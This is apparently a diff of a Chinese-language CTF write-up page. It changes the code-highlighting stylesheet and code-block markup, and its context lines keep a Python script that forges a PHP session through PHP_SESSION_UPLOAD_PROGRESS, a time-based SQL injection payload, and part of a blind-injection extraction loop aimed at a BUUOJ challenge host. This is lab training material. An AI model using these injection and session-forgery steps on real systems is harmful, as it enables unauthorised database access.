@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -250,7 +258,7 @@
 <p>但<code>index.php</code>里有过滤<br><img src="https://s3.bmp.ovh/imgs/2021/09/3ebd4db23b9bee97.png" srcset="/img/loading.gif">     </p>
 <p><code>addslashes</code>函数会转义字符<br>有个<code>session_start()</code>函数<br>看WP说可以伪造<code>session</code>直接访问<code>login.php</code>从而绕过<code>index.php</code>中的过滤</p>
 <p><strong>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</strong>     </p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 
 url = <span class="hljs-string">&quot;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&quot;</span>
 
@@ -258,11 +266,11 @@ files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hl
 a = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,
                   cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;,
                   proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)
-print(a.text)</code></pre></div>
+print(a.text)</code></pre>
 
 
 <p>然后在Burp中改<code>username=1&#39;%22%20or%20sleep(4)%23</code>成功延时    </p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> time
 
 files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;1234567&#x27;</span>&#125;
@@ -291,7 +299,7 @@ flag=<span class="hljs-string">&#x27;&#x27;</span>
     <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid==<span class="hljs-number">128</span>):
         <span class="hljs-keyword">break</span>
     flag+=<span class="hljs-built_in">chr</span>(mid)
-    print(flag)</code></pre></div>
+    print(flag)</code></pre>
 
             </div>
             <hr>
@@ -449,6 +457,8 @@ flag=<span class="hljs-string">&#x27;&#x27;</span>
 
 
 
+  
+    
   
 
 
